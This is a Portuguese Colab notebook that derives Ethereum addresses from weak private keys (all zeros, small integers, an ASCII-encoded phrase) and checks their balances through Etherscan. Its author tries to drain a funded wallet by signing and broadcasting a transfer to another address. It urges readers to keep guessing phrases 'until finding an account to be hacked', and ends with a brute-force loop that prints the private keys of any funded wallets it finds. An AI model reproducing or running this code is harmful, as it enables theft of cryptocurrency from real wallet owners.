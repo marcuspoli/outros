{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Explorando_private_keys.ipynb",
      "version": "0.3.2",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/marcuspoli/outros/blob/master/Explorando_private_keys.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "QeH4ZF_NuAya",
        "colab_type": "text"
      },
      "source": [
        "Este artigo foi inspirado em reportagens que rodaram o mundo informando a possibilidade de hackers roubarem criptomoedas e tokens explorando vulneralidades de chaves privadas. \n",
        "Para quem não viu reportagem alguma, leia **Andy Greenberg**, 'BLOCKCHAIN BANDIT' IS GUESSING PRIVATE KEYS AND SCORING MILLIONS no link abaixo.\n",
        "https://www.wired.com/story/blockchain-bandit-ethereum-weak-private-keys/\n",
        "\n",
        "O primeiro teste a ser reproduzido explora a possibilidade de alguém criar manualmente uma das primeiras carteiras do Blockchain.\n",
        "\n",
        "A ideia é imaginar o que foi feito e reproduzir.\n",
        "\n",
        "Se quiser ir lendo e executando, execute o link \n",
        "https://colab.research.google.com/drive/1fMCz3G7D_l5_FAsmpdRIAMEhZqPwcPP5\n",
        "\n",
        "\n",
        "Primeiro, instalamos a biblioteca eth_account."
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "WSWljAUs2VBU",
        "colab_type": "code",
        "outputId": "dca580da-2af3-4d3f-f830-725694db7b86",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 292
        }
      },
      "source": [
        "!pip install eth_account"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Requirement already satisfied: eth_account in /usr/local/lib/python3.6/dist-packages (0.3.0)\n",
            "Requirement already satisfied: eth-utils<2,>=1.0.2 in /usr/local/lib/python3.6/dist-packages (from eth_account) (1.5.2)\n",
            "Requirement already satisfied: hexbytes<1,>=0.1.0 in /usr/local/lib/python3.6/dist-packages (from eth_account) (0.1.0)\n",
            "Requirement already satisfied: eth-keys<0.3.0,>=0.2.0b3 in /usr/local/lib/python3.6/dist-packages (from eth_account) (0.2.2)\n",
            "Requirement already satisfied: eth-rlp<1,>=0.1.2 in /usr/local/lib/python3.6/dist-packages (from eth_account) (0.1.2)\n",
            "Requirement already satisfied: attrdict<3,>=2.0.0 in /usr/local/lib/python3.6/dist-packages (from eth_account) (2.0.1)\n",
            "Requirement already satisfied: eth-keyfile<0.6.0,>=0.5.0 in /usr/local/lib/python3.6/dist-packages (from eth_account) (0.5.1)\n",
            "Requirement already satisfied: cytoolz<1.0.0,>=0.8.2; implementation_name == \"cpython\" in /usr/local/lib/python3.6/dist-packages (from eth-utils<2,>=1.0.2->eth_account) (0.9.0.1)\n",
            "Requirement already satisfied: eth-typing<3.0.0,>=1.0.0 in /usr/local/lib/python3.6/dist-packages (from eth-utils<2,>=1.0.2->eth_account) (2.1.0)\n",
            "Requirement already satisfied: eth-hash<1.0.0,>=0.1.0 in /usr/local/lib/python3.6/dist-packages (from eth-utils<2,>=1.0.2->eth_account) (0.2.0)\n",
            "Requirement already satisfied: rlp<2,>=0.6.0 in /usr/local/lib/python3.6/dist-packages (from eth-rlp<1,>=0.1.2->eth_account) (1.1.0)\n",
            "Requirement already satisfied: six in /usr/local/lib/python3.6/dist-packages (from attrdict<3,>=2.0.0->eth_account) (1.12.0)\n",
            "Requirement already satisfied: pycryptodome<4.0.0,>=3.4.7 in /usr/local/lib/python3.6/dist-packages (from eth-keyfile<0.6.0,>=0.5.0->eth_account) (3.8.1)\n",
            "Requirement already satisfied: toolz>=0.8.0 in /usr/local/lib/python3.6/dist-packages (from cytoolz<1.0.0,>=0.8.2; implementation_name == \"cpython\"->eth-utils<2,>=1.0.2->eth_account) (0.9.0)\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "KuZC89EYhYz9",
        "colab_type": "text"
      },
      "source": [
        "Depois importamos e encontramos o endereço público da primeira carteira."
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "VaSRwsSsw3ig",
        "colab_type": "code",
        "outputId": "998c537d-cad2-4575-8baf-47d666ffb78c",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 54
        }
      },
      "source": [
        "import eth_account\n",
        "Account = eth_account.Account()\n",
        "var1 = ''\n",
        "var1 = var1.zfill(64)\n",
        "var1 = '0x' + var1\n",
        "print('A primeira chave privada do Blockchain é ' + var1)\n",
        "acct = Account.privateKeyToAccount( var1 )\n",
        "print('O endereço público dessa chave é ' + acct.address)"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "A primeira chave privada do Blockchain é 0x0000000000000000000000000000000000000000000000000000000000000000\n",
            "O endereço público dessa chave é 0x3f17f1962B36e491b30A40b2405849e597Ba5FB5\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "lF133Lad3h91",
        "colab_type": "text"
      },
      "source": [
        "Se fizemos tudo certo, descobrimos que a chave pública da primeira carteira do Blockchain é a 0x3f17f1962B36e491b30A40b2405849e597Ba5FB5.\n",
        "\n",
        "Agora vamos ver se há saldo nessa carteira.\n",
        "\n",
        "Para saber se há saldo pesquisamos o endereço da carteira no serviço da Etherscan https://etherscan.io/address/0x3f17f1962B36e491b30A40b2405849e597Ba5FB5\n",
        "\n",
        "Hoje, primeiro de maio de dois mil e dezenove, há um saldo de aproximadamente mil e setecentos dólares nessa carteira, ou seja, um pouco mais de dez ETH e cinquenta e oito tokens ERC-20 também.\n",
        "\n",
        "Você deve estar pensando qual o motivo de não esvaziarmos essa carteira e quer saber, não era o nosso objetivo, mas vamos lá. \n",
        "\n",
        "\n",
        "\n",
        "\n",
        "O primeiro teste para esvaziar este cofre foi o de importar a chave privada no METAMASK. Infelizmente, a resposta foi \"Cannot import invalid private key.\"\n",
        "\n",
        "O segundo foi abrir o site do MyEtherWallet \n",
        "https://vintage.myetherwallet.com/#view-wallet-info e para a minha infelicidade, a mensagem foi parecida '(error_41) Please enter a valid private key'\n",
        "\n",
        "A terceira e ultima tentativa foi a de programar uma parte e postar no Blockchain através da API da Etherscan. O código usado está abaixo.\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "bQy-TGnP9Rlk",
        "colab_type": "code",
        "outputId": "aeeb8fdd-b42f-47c8-ea8b-e16659d26e47",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 55
        }
      },
      "source": [
        "transaction = {\n",
        "#        'from': '0x3f17f1962B36e491b30A40b2405849e597Ba5FB5',\n",
        "        'to': '0x8D0785c7e1C107921Ae869B541ad8D81EFacA927',\n",
        "        'value': 1000000000,\n",
        "        'gas': 2000000,\n",
        "        'gasPrice': 7654321,\n",
        "        'nonce': 0,\n",
        "    }\n",
        "signed = acct.signTransaction(transaction)\n",
        "print(signed)"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "AttrDict({'rawTransaction': HexBytes('0xf867808374cbb1831e8480948d0785c7e1c107921ae869b541ad8d81efaca927843b9aca00801ba0a9a3f9cb989bf53359e502f310de882442b4d363b0a320978eb79682f28c7a96a049c5a071b1882086f63e3fec6d6c947da64fe8dc1072fd2bef745ec0e0218de8'), 'hash': HexBytes('0x0e17d2bf851e2737d531c219de1e5f67906104d4076a115f1ee1cd3daa4218f4'), 'r': 76730591505912046220150939802083475462038935837246312755004272816564688681622, 's': 33368014162925522991879316326015973436287912077046728404057946927745565036008, 'v': 27})\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "bM93KDxc9-7s",
        "colab_type": "text"
      },
      "source": [
        "A boa noticia é que conseguimos criar a transação assinada com a chave privada.\n",
        "\n",
        "Agora, vamos cruzar os dedos e postar no blockchain essa transação. \n",
        "O que interessa para passarmos no parametro é o resultado que está dentro do HexBytes('') do resultado acima.\n",
        "Veja como ficaria o link para postarmos:\n",
        "https://api.etherscan.io/api?module=proxy&action=eth_sendRawTransaction&hex=0xf867808374cbb1831e8480948d0785c7e1c107921ae869b541ad8d81efaca927843b9aca00801ba0a9a3f9cb989bf53359e502f310de882442b4d363b0a320978eb79682f28c7a96a049c5a071b1882086f63e3fec6d6c947da64fe8dc1072fd2bef745ec0e0218de8&apikey=YourApiKeyToken\n",
        "\n",
        "Nao adiantou, não deu certo novamente.\n",
        "{\"jsonrpc\":\"2.0\",\"id\":1,\"error\":{\"code\":-32000,\"message\":\"invalid sender\"}}\n",
        "\n",
        "Desconfiei do parametro apiKey=YourApiKeyToken e troquei por um token que tenho e a mesma mensagem apareceu.\n",
        "\n",
        "Descomentei o \"from\" do código acima e postei novamente com o novo hash e a mesma mensagem apareceu. Que frustração. Pensei que passaria um fim de semana de rei, porém, não foi dessa vez. :( \n",
        "\n",
        "Mas essa foi só a primeira conta do Blockchain e as próximas? Será que há saldos como essa aí? Vamos fazer um consulta nas próximas cem contas.\n",
        "\n",
        "Primeiro instalamos uma biblioteca chamada urlopen, pois, nao queremos sair no CTRL+C e CTRL+V em cada chave pública que capturamos."
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "6qAX9tlwB_Vo",
        "colab_type": "code",
        "outputId": "bf2f98e1-92be-42d7-c691-a0179cfd2e60",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 35
        }
      },
      "source": [
        "!pip install urlopen"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Requirement already satisfied: urlopen in /usr/local/lib/python3.6/dist-packages (1.0.0)\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "uS07-VwJlcOw",
        "colab_type": "text"
      },
      "source": [
        "Agora, criamos o programa considerando as chaves complementares que partem de 01 até 99 e pesquisamos automaticamente utilizando uma API de consulta em JSON."
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "_PbiwiUgA0L4",
        "colab_type": "code",
        "outputId": "ed56f25b-2446-40be-ba1a-2735faaf23bd",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 345
        }
      },
      "source": [
        "from urllib.request import urlopen\n",
        "for x in range(1,10):\n",
        "    compl = str(x)\n",
        "    compl = compl.zfill(2)\n",
        "    acct = Account.privateKeyToAccount( '0x00000000000000000000000000000000000000000000000000000000000000' + compl )\n",
        "    url = 'https://api.etherscan.io/api?module=account&action=balance&address=' + acct.address\n",
        "    response = urlopen(url)\n",
        "    print('lendo ' + url)\n",
        "    print(response.read())\n",
        "    "
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "lendo https://api.etherscan.io/api?module=account&action=balance&address=0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf\n",
            "b'{\"status\":\"1\",\"message\":\"OK\",\"result\":\"0\"}'\n",
            "lendo https://api.etherscan.io/api?module=account&action=balance&address=0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF\n",
            "b'{\"status\":\"1\",\"message\":\"OK\",\"result\":\"0\"}'\n",
            "lendo https://api.etherscan.io/api?module=account&action=balance&address=0x6813Eb9362372EEF6200f3b1dbC3f819671cBA69\n",
            "b'{\"status\":\"1\",\"message\":\"OK\",\"result\":\"0\"}'\n",
            "lendo https://api.etherscan.io/api?module=account&action=balance&address=0x1efF47bc3a10a45D4B230B5d10E37751FE6AA718\n",
            "b'{\"status\":\"1\",\"message\":\"OK\",\"result\":\"0\"}'\n",
            "lendo https://api.etherscan.io/api?module=account&action=balance&address=0xe1AB8145F7E55DC933d51a18c793F901A3A0b276\n",
            "b'{\"status\":\"1\",\"message\":\"OK\",\"result\":\"0\"}'\n",
            "lendo https://api.etherscan.io/api?module=account&action=balance&address=0xE57bFE9F44b819898F47BF37E5AF72a0783e1141\n",
            "b'{\"status\":\"1\",\"message\":\"OK\",\"result\":\"0\"}'\n",
            "lendo https://api.etherscan.io/api?module=account&action=balance&address=0xd41c057fd1c78805AAC12B0A94a405c0461A6FBb\n",
            "b'{\"status\":\"1\",\"message\":\"OK\",\"result\":\"0\"}'\n",
            "lendo https://api.etherscan.io/api?module=account&action=balance&address=0xF1F6619B38A98d6De0800F1DefC0a6399eB6d30C\n",
            "b'{\"status\":\"1\",\"message\":\"OK\",\"result\":\"0\"}'\n",
            "lendo https://api.etherscan.io/api?module=account&action=balance&address=0xF7Edc8FA1eCc32967F827C9043FcAe6ba73afA5c\n",
            "b'{\"status\":\"1\",\"message\":\"OK\",\"result\":\"0\"}'\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "FpbAEyT5Ezo-",
        "colab_type": "text"
      },
      "source": [
        "Infelizmente, não há saldos nessas contas.\n",
        "Porém, conseguimos reproduzir o que seriam algumas das chaves privadas consideradas fracas para os Hackers.\n",
        "\n",
        "Há um outro meio de explorarmos chaves fracas que consiste em adivinhar a frase que o criador da chave colocou para facilitar a memorização. \n",
        "Como funciona este processo de adivinhação? Sabemos que a composição da chave privada é sempre 32 bytes representados graficamente em 64 Hexadecimais, logo, se imaginarmos que alguém codificasse a frase com 32 letras [SATOSHI NAKAMOTONAKAMOTO SATOSHI], chegariamos a composição de uma chave privada de 64 hexadecimais e teriamos a chave privada completa.\n",
        "\n",
        "Veja como ficaria.\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8_HLxPZyoarL",
        "colab_type": "code",
        "outputId": "e3f370c2-7a64-4539-d600-24e78f75630e",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 35
        }
      },
      "source": [
        "segredo = 'SATOSHI NAKAMOTONAKAMOTO SATOSHI'\n",
        "chave_privada = '0x'\n",
        "for x in segredo:\n",
        "  chave_privada = chave_privada + str(hex(ord(x)))[2:]\n",
        "chave_privada = chave_privada.ljust(66, '0')\n",
        "if len(chave_privada) > 66:\n",
        "  print(\"A chave privada ultrapassa o tamanho máximo. Veja se a variável segredo tem mais 32 chars\")\n",
        "else:\n",
        "  print(chave_privada)"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "0x5341544f534849204e414b414d4f544f4e414b414d4f544f205341544f534849\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ZdY0o_Pxt8Y0",
        "colab_type": "text"
      },
      "source": [
        "Como o objetivo é pescar uma carteira que tenha saldo, mude o valor atribuido a variavel \"segredo\" e execute a pesquisa do saldo no código abaixo."
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ZiRE12OfuMbS",
        "colab_type": "code",
        "outputId": "e69235cf-168e-4214-f44f-1f7aecf42f42",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 72
        }
      },
      "source": [
        "acct = Account.privateKeyToAccount( chave_privada )\n",
        "print('a chave pública é ' + acct.address)\n",
        "url = 'https://api.etherscan.io/api?module=account&action=balance&address=' + acct.address\n",
        "response = urlopen(url)\n",
        "print('lendo ' + url)\n",
        "print(response.read())"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "a chave pública é 0x343Ee1aB9b88671267372aBdD5810b21062984f2\n",
            "lendo https://api.etherscan.io/api?module=account&action=balance&address=0x343Ee1aB9b88671267372aBdD5810b21062984f2\n",
            "b'{\"status\":\"1\",\"message\":\"OK\",\"result\":\"0\"}'\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "SRJy3PK8vZC9",
        "colab_type": "text"
      },
      "source": [
        "Você pode mudar o valor da variavel \"segredo\" procurando por outras palavras ou frases de até 32 caracteres até encontrar alguma conta com saldo a ser hackeada, lembrando que as palavras podem combinar caracteres maiúsculos e minúsculos, números, acentuações etc...\n",
        "\n",
        "Por fim, há também uma suposta falha no randômico que pode ser explorada com umas mil horas de paciência em servidores na nuvem. O objetivo é esperar que o randômico da biblioteca \"random\" imprima uma carteira que já foi utilizada.\n",
        "\n",
        "Bom, eu nao vou esperar.\n",
        "Boa sorte e se tiver mais alguma ideia, contribua também.\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "4wDaMp-Nv42U",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import random\n",
        "import eth_account\n",
        "import json\n",
        "from urllib.request import urlopen\n",
        "Account = eth_account.Account()\n",
        "i = 0\n",
        "x = 0\n",
        "while i < 2:\n",
        "    x = x + 1\n",
        "    bits = random.getrandbits(256)\n",
        "    bits_hex= hex(bits)\n",
        "    bits_hex=bits_hex.ljust(66, '0')\n",
        "   # print('bits_hex=' + bits_hex)\n",
        "    if (x % 10) == 0:\n",
        "      print('carteiras lidas [' + str(x) + ']')\n",
        "    acct = Account.privateKeyToAccount( bits_hex )\n",
        "    url = 'https://api.etherscan.io/api?module=account&action=balance&address=' + acct.address\n",
        "    response = urlopen(url)\n",
        "    data = response.read()\n",
        "    encoding = response.info().get_content_charset('utf-8')\n",
        "    JSON_object = json.loads(data.decode(encoding))\n",
        "    for p in JSON_object:\n",
        "        key = p\n",
        "        value = JSON_object[p]\n",
        "        if (key == 'result') :\n",
        "            if (value != '0'):\n",
        "                i = i + 1\n",
        "                print('lendo ' + str(x))\n",
        "                print('Chave pública=' + acct.address)\n",
        "                print('Chave privada=' + acct.privateKey.hex())\n",
        "                print(\"O saldo da conta no blockchain é de = ({})\".format(value))\n",
        "                input(\"pressione uma tecla qualquer para continuar\")\n"
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}